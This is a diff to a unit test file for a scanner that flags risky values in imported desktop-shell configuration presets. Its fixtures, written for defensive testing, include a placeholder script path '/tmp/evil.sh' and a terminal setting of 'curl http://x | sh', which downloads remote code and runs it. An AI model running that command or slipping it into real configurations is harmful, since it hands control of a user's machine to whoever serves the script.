@@ -918,11 +918,18 @@ class TestPresetScan(unittest.TestCase):
 
     def test_machine_local_values_are_never_reported(self):
         """merge() hands these back, so a preset cannot deliver them."""
-        preset = {"update": {"scriptPath": "/tmp/evil.sh"},
+        preset = {"wallpaperSelector": {"customDefaultPath": "/tmp/evil.sh"},
                   "screenRecord": {"savePath": "/home/attacker/vids"}}
-        current = {"update": {"scriptPath": "/home/me/update.sh"},
+        current = {"wallpaperSelector": {"customDefaultPath": "/home/me/Pictures"},
                    "screenRecord": {"savePath": "/home/me/Videos"}}
         self.assertEqual(self.scan(preset, current)["total"], 0)
+
+    def test_retired_machine_local_key_is_still_reported_as_unknown(self):
+        """update.scriptPath left Config.qml and the LOCAL_ONLY list together
+        (e51624355), so nothing hands it back any more; a command hiding in it
+        must surface like any other key this build has never heard of."""
+        result = self.scan({"update": {"scriptPath": "/tmp/evil.sh"}}, {})
+        self.assertEqual(self.paths(result, "unknown"), ["update.scriptPath"])
 
     def test_groups_come_back_worst_first(self):
         preset = {"apps": {"terminal": "curl http://x | sh"},
